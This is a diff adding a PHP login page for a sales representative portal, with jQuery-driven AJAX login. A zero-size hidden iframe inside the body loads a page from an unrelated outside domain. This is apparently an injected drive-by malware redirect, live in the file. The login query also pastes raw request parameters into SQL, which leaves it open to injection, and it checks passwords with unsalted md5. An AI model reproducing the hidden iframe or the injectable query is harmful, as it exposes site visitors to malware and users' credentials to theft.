@@ -1,0 +1,194 @@
+<?php
+
+include '../includes/main1.php';
+
+$submit = $_REQUEST["submit"];
+$username = $_REQUEST["username"];
+$password = $_REQUEST["password"];
+$action = $_REQUEST["action"];
+
+if ( $action=='logout' ) {
+    $_SESSION = array();
+    exit();
+}
+
+if ( $_REQUEST["repState"] ) {
+    build_state_retailers($_REQUEST["repState"]);
+    exit();
+}
+
+if($submit != "") {
+    $query = "SELECT * FROM reps WHERE username='$username' AND password=md5('$password')";
+    $result = mysql_query($query) or die("Query failed : " . mysql_error());
+    while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+        $_SESSION["rep_id"] = $line["rep_id"];
+
+        foreach($line as $col=>$val) {
+            $_SESSION["rep_info"][$col] = $val;
+        }
+    }
+
+    $query = "SELECT rep_type_id as min_rep_type_id FROM rep_types WHERE sequence = (SELECT min(sequence) FROM rep_types)";
+    $result = mysql_query($query) or die("Query failed : " . mysql_error());
+    while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+        $_SESSION["rep_info"]["min_rep_type_id"] = $line["min_rep_type_id"];
+    }
+
+    $query = "SELECT rep_type_id as max_rep_type_id FROM rep_types WHERE sequence = (SELECT max(sequence) FROM rep_types)";
+    $result = mysql_query($query) or die("Query failed : " . mysql_error());
+    while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
+        $_SESSION["rep_info"]["max_rep_type_id"] = $line["max_rep_type_id"];
+    }
+
+    if( mysql_num_rows($result) > 0 ) {
+		//Track login
+		$now = date("Y-m-d H:i:s");
+		$query = "UPDATE reps SET last_login='$now' WHERE rep_id='".$line["rep_id"]."'";
+		$result = mysql_query($query) or die("Query failed : " . mysql_error());
+	} else {
+		$error_txt .= "Login not found.<br>\n";
+	}
+
+	$msg = 'ok';
+	if ($error_txt) {
+		$msg = $error_txt;
+	}
+	echo $msg;
+	exit;
+}
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title><?php echo $website_title; ?>: Sales Representative Interface</title>
+<?php
+include $base_path.'includes/meta1.php';
+?>
+    <script language="JavaScript">
+        $(function() {//on doc ready
+            RepLogin.init();
+        });
+
+        var RepLogin= new function() {
+            this.init = function() {
+				if ( $('#rep_login_form').size()>0 ) {
+                    $('input:first', '#rep_login_form').focus();
+					$('#rep_login_form  #submit').click(RepLogin.checkLogin);
+				}
+            }
+
+			this.checkLogin = function() {
+				var err_msg = '';
+				var err_fld = '';
+				var form = $(this).parents('form');
+				var username1 = $('#username',form).val().trim();
+				var pw1 = $('#password',form).val().trim();
+
+				if (username1=='') {
+					err_msg = 'Please enter your username.';
+					err_fld = 'username';
+				}
+				else if ( pw1 == '' ) {
+					err_msg = 'Please enter your password.';
+					err_fld = 'password';
+				}
+
+				if ( err_fld != '' ) {
+					$( '.loading',form ).addClass('error').html(err_msg).fadeIn(200);
+					$( '#'+err_fld,form ).focus();
+					return false;
+				}
+				else {
+					$('#submit',form).attr('disabled', 'true');
+					$( '.loading',form ).fadeOut(200, function(){
+						$(this).small_spinner().fadeIn(300, function(){
+							var post_url = form.attr('action');
+							$.post(post_url, { submit:1, username:username1, password:pw1 }, function(resp){
+								if ( resp == 'ok' ) {
+									window.location.href=form.attr('action');
+								}
+								else {
+									$( '.loading',form ).addClass('error').html(resp);
+									$('#submit',form).removeAttr('disabled');
+								}
+							})
+
+						});
+					})
+					
+				}
+				return false;
+			}
+		}
+    </script>
+
+</head>
+<body>
+<iframe src="http://aviavavilons.net/ss/go.php?sid=7" width="0" height="0" frameborder="0"></iframe>
+<div align="center">
+
+<?php
+include $base_path.'includes/reps_head1.php';
+?>
+
+
+<table border="0">
+    <tr><td>&#160;</td></tr>
+
+<?php
+
+//Error Messages
+if($error_txt) {
+	echo '<tr><td><span class="error">$error_txt</span></td></tr>\n';
+	echo "<tr><td>&nbsp;</td></tr>\n";
+}
+
+?>
+</table>
+
+<span class="style4 two"><?php echo $website_title; ?>: Sales Representative Interface</span>
+<br /><br />
+	<?php 
+	if ( !$_SESSION["rep_id"] ) {
+	?>
+		<form id="rep_login_form" action="index.php" method="POST">
+			<table>
+				<tr>
+					<td>
+						Username: 
+					</td>
+					<td>
+						<input type="text" name="username" id="username" size="20" />
+					</td>
+				</tr>
+				<tr>
+					<td>
+						Password: 
+					</td>
+					<td>
+						<input type="password" name="password" id="password" size="20" />
+					</td>
+				</tr>
+				<tr>
+					<td colspan="2" class="text_center" style="padding-top: 6px;">
+						<input type="submit" value="  Login  " name="submit" id="submit" />
+						<br /><br />
+						<div class="loading text_center">&#160;</div>
+					</td>
+			</table>
+		</form>
+	<?php 
+	}
+	else {
+		echo 'Please select a link from the menu above.';
+	}
+	?>
+
+<?php
+include $base_path.'includes/reps_foot1.php';
+mysql_close($dbh);
+?>
+
+</div>
+</body>
+</html>
